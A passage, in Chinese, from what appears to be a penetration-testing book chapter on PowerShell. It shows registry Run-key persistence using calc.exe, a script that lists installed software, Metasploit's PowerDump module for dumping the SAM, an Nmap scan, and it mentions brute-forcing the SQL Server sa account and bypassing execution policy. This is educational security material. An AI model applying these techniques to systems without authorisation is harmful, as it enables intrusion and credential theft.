  \ registry access is not allowed`的错误。因此，我们在这里所做的是首先快速查看`HKLM:\\SOFTWARE\\Microsoft\\\
  Windows\\CurrentVersion\\Run`键中已有的值，正如我们在本节前面讨论的那样。然后，我们设置一个变量来保存我们将在注册表中创建条目的路径，称为`$regpath`，并用我们的位置填充它。\n\
  \n我们还设置了`$apppath`变量，其中包含我们将在启动时启动的应用程序的路径，在本例中是 Windows 计算器应用程序，位于`%windir%\\system32\\\
  calc.exe`，以及`$name`值，该值在本例中保存字符串`\"Calc\"`作为我们预期值的名称。我们这个小脚本的核心是`Set-ItemProperty`\
  \ cmdlet，它正如我们所想的那样，向指定的注册表键添加一个新值。然后我们调用`Set-ItemProperty`，使用`Set-ItemProperty\
  \ –path $regpath –name $name –value $apppath`来插入所有变量的值，然后我们就进入了注册表。\n\n之后，我们再次运行`Get-ItemProperty`，以便看到我们劳动的成果。我们应该会看到大量文本滚动过去，最终看到我们新创建的值的清晰视图，如图\
  \ 6.8 所示。\n\n![image](img/F000060f06-08-9781597497299.jpg)\n图 6.8 向注册表添加值\n\n\n\n\
  如果我们计划频繁使用这个脚本，很可能需要针对注册表中的不同目标位置以及要安装的不同应用程序进行调整。我们可以轻松修改脚本，将这些参数作为输入参数传入，正如我们在第\
  \ 1 章中介绍 PowerShell 基础知识时所讨论的那样。\n\n我们还可以利用注册表收集所检查系统和环境的各种信息。另一个值得关注的位置是 `HKLM:\\\
  Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall`。该位置保存了系统的卸载信息，在渗透测试中可能很有用。在这里我们可以找到应用程序名称、安装时间、主版本号和次版本号以及其他大量信息。让我们编写一段代码来检索这些信息，并将其导出到一个文件中，以便后续查看。\n\
  \n```\n$file = \"c:\\temp\\installed-software.txt\"\n\nGet-ChildItem hklm:\\software\\\
  microsoft\\windows\\currentversion\\uninstall | ForEach-Object{\n\n$property = Get-ItemProperty\
  \ $_.pspath | out-file $file -append\n\n}\n```\n\n这是一个非常简短的脚本，但它为我们完成了大量工作。如果我们打开\
  \ `Regedit` 查看 `HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall`，如图\
  \ 6.9 所示，就会发现这并不是注册表中最容易解析的位置。\n\n![image](img/F000060f06-09-9781597497299.jpg)\n\
  \n图 6.9 Regedit\n\n这些键名非常晦涩，而且每个键下都有大量名称-值对。如果能有一个简单的列表，无论是用于手动阅读还是用于其他工具（如 `grep`）解析，都会方便得多。\n\
  \n来看这个脚本，第一行设置了输出文件的位置，并将其存储在 `$file` 变量中，这里为 `c:\\temp\\installed-software.txt`。接下来，我们使用\
  \ `Get-ChildItem` cmdlet 递归遍历 `HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\\
  Uninstall` 下的所有子键，并将结果传递给 `ForEach-Object` cmdlet 来处理迭代。`ForEach-Object` 正如其名，对所有结果执行类似\
  \ foreach 循环的迭代，而无需我们显式编写循环代码。当 `ForEach-Object` cmdlet 处理子键时，我们对每个子键执行 `Get-ItemProperty`\
  \ 以导出条目。对于找到的每组值，我们将其传递给 `Out-File`，该命令会将内容追加到 `$file` 中存储的文件位置。\n\n最终，我们会得到一个内容类似于图\
  \ 6.10 所示的文件。该文件可能包含大量信息，因为它不仅包括用户安装的软件，还包括操作系统自带的组件、补丁条目等。方便的是，输出格式非常适合使用 `grep`\
  \ 等搜索工具，如果我们想快速获取名称、版本、安装路径或其他类似信息的话。\n\n![image](img/F000060f06-10-9781597497299.jpg)\n\
  \n图 6.10 Installedsoftware.ps1 输出\n\n我们可以对注册表进行大量调整，从而在 Microsoft 操作系统上产生各种不同的效果。通过一些研究，我们可以找到注册表中能够改变网络功能、账户处理、加密方式以及实现其他各种更改的位置。\n\
  \n## PowerShell 与 Metasploit\n\n我们在本章中讨论的一些有趣的 PowerShell 组件（以及更多）可以通过 Metasploit\
  \ 以更自动化的方式使用。对于不熟悉 Metasploit 的人来说，它被称为攻击框架。攻击框架（常见的还有 Core Impact 和 Immunity Canvas）是一组工具，通过将漏洞利用、载荷和其他相关工具整合到一个工具集中，使我们能够更快速地实施攻击，并且比单独使用这些工具更容易上手。\n\
  \n许多此类工具还提供了一定程度的自动化，包括网络和/或主机扫描，以及评估目标上可能存在的漏洞。在本节中，我们将简要介绍一些可以用 Metasploit 完成的工作。对于那些有兴趣进一步了解\
  \ Metasploit 功能的人，有许多不错的资源可供参考。Offensive Security 在 [www.offensive-security.com/metasploit-unleashed/Metasploit_Unleashed_Information_Security_Training](http://www.offensive-security.com/metasploit-unleashed/Metasploit_Unleashed_Information_Security_Training)\
  \ 上提供了一套免费教程，此外还有几本书籍涵盖了该主题，例如 Jeremy Faircloth 所著的 *Penetration Tester’s Open Source\
  \ Toolkit* 第三版（ISBN: 978-1-59749-627-8，Syngress），以及 David Kennedy（没错，就是同一个人）、Jim\
  \ O’Gorman、Devon Kearns 和 Mati Aharoni 合著的 *Metasploit: A Penetration Tester’s Guide*（ISBN:\
  \ 978-1593272883）。\n\n### 面向 PowerShell 的 Metasploit 模块\n\n尽管直接与 PowerShell 相关的\
  \ Metasploit 模块数量不多，但这一数字正在缓慢增长。现在库中有几个模块在渗透测试中可能很方便，因此我们将快速了解其中一些，然后使用 Metasploit\
  \ 针对测试系统进行操作，以展示它们的功能。\n\n### PowerDump\n\n`PowerDump` 是 Metasploit 中一个有趣的模块，它允许我们转储\
  \ Microsoft 操作系统上的安全账户管理器（SAM）数据库。但需要注意的是，该特定模块及其背后的 PowerShell 代码会被较新 Microsoft\
  \ 操作系统上注册表中的安全措施所阻止。\n\n要使用此代码，我们需要能够读取诸如 `HKLM:\\SAM\\SAM\\Domains\\Accounts\\\
  Users` 之类的注册表键。与本章前面讨论的需要管理员权限才能写入 `HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\\
  Run` 类似，注册表的这一部分配置了非常严格的权限。在这种情况下，管理员权限也不足以访问。虽然完全有可能更改注册表这一部分的权限，但这超出了我们这里要做的范围，因为它涉及对系统进行相对较大的修改。\n\
  \n不过，我们可能可以在较旧的系统上使用它，例如 Windows XP 或 Server 2003，具体取决于这些系统的补丁级别。\n\n### Windows\
  \ 收集 PowerShell 环境设置枚举\n\n这个特定模块由 Carlos Perez（darkoperator）编写，使我们能够查看目标机器上 PowerShell\
  \ 的环境设置。更具体地说，它会显示诸如 PowerShell 是否已安装、执行策略设置为什么、PowerShell 安装位置、是否安装了 PowerShell\
  \ 管理单元或模块，以及是否有用户安装了 PowerShell 配置文件等信息。\n\n这组信息非常有用，因为它能让我们立即更清楚地了解我们所处的环境。这可能会避免我们遇到诸如执行策略设置不符合需求，或者在不必要的情况下使用\
  \ `CreateCMD` 之类的问题。\n\n### 使用这些模块\n\n首先，我们需要在目标系统上获得一个立足点。寻找漏洞时，最好的方法之一是运行 `Nmap`：\n\
  \n```\nStarting Nmap 5.50( http://nmap.org) at 2011-05-10 07:26 Mountain Daylight\
  \ Time\n```\n\n\n\n\nNmap 扫描报告 10.0.0.117\n\n主机处于活动状态（延迟 0.00032 秒）。\n\n未显示：988\
  \ 个关闭端口\n\n端口       状态      服务         版本\n80/tcp     开放      http         Microsoft\
  \ HTTPAPI httpd 2.0 (SSDP/UPnP)\n135/tcp    开放      msrpc        Microsoft Windows\
  \ RPC\n139/tcp    开放      netbios-ssn\n445/tcp    开放      netbios-ssn\n1433/tcp\
  \   开放      ms-sql-s     Microsoft SQL Server 2008\n2383/tcp   开放      ms-olap4?\n\
  5357/tcp   开放      http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n49152/tcp\
  \  开放      msrpc        Microsoft Windows RPC\n49153/tcp  开放      msrpc        Microsoft\
  \ Windows RPC\n49154/tcp  开放      msrpc        Microsoft Windows RPC\n49155/tcp\
  \  开放      msrpc        Microsoft Windows RPC\n49156/tcp  开放      msrpc        Microsoft\
  \ Windows RPC\n\n`Nmap` 结果向我们展示了一个不错的开放 SQL Server 服务，我们可以针对 1433 端口进行攻击。在 Offensive\
  \ Security 提供的教程文档中，我们可以找到 `MSSQL Bruter` 的演练，^(4) 它将指导我们如何暴力破解 `sa` 账户密码，并在系统上获得一个\
  \ `Meterpreter` shell。此时，我们可以利用诸如 `PowerDump`、`Windows Gather PowerShell Environment\
  \ Setting Enumeration` 等模块，以及其他许多模块。`Meterpreter` 还具备丰富的功能，允许我们在系统上执行各种有趣的操作，但这本身就是一个需要整卷书来讨论的话题。\n\
  \n## 总结\n\n`PowerShell` 在某些渗透测试场景中非常实用。\n\n在 Windows 机器上访问 `.NET` 的所有功能，可以赋予我们原本在该环境中可能不具备的能力，而无需将工具上传到系统。如果我们能够简单地编写、上传甚至复制粘贴脚本到系统中，那么我们可以实施的攻击范围将显著增加。\n\
  \n在系统上使用 `PowerShell` 的一个障碍是处理执行策略，这些策略旨在阻止我们以期望的方式使用脚本。`Restricted`、`AllSigned`\
  \ 和 `RemoteSigned` 策略都对我们在系统上运行 `PowerShell` 脚本的方式施加了限制，主要围绕脚本的来源及其签名方式。理想情况下，我们希望将执行策略设置为\
  \ `Unrestricted`，这样我们就可以为所欲为，但这需要对系统进行更改，而我们可能无法做到。幸运的是，基于 Peters、Kelley 和 Kennedy\
  \ 的代码，我们可以相对轻松地绕过这些策略。\n\n进入系统以执行我们的 `PowerShell` 代码可能会带来挑战，也可能不会，这取决于所使用的特定操作系统、版本和补丁级别。Windows\
  \ 系统上存在许多常见漏洞，这些漏洞通常未打补丁，同时也有大量薄弱环节可供我们寻找突破口。正如我们在本书前面讨论过的，有几本关于这个主题的好书以及一些工具（如\
  \ `Nmap`、`Nessus` 和 `Metasploit`）可以为我们提供帮助。\n\n一旦我们获得了对系统的访问权限，就可以将 `PowerShell`\
  \ 用于多种渗透测试用途。我们可以控制系统上的进程，以启动或停止系统正在运行的进程，从而简化渗透测试工作。我们可以与事件日志交互，以读取或操作它们。我们可以调整注册表，添加、删除或修改其中的部分内容。我们可以通过网络获取或发送文件。当我们拥有\
  \ Microsoft 系统的管理权限时，可能性几乎是无限的。\n\n最后但同样重要的是，我们可以使用 `Metasploit` 与 `PowerShell`\
  \ 交互。有几个很好的模块允许我们生成 shell，并通过 `Metasploit` 使用我们在本章中手动讨论的一些代码。\n\n## 尾注\n\n1. DEF\
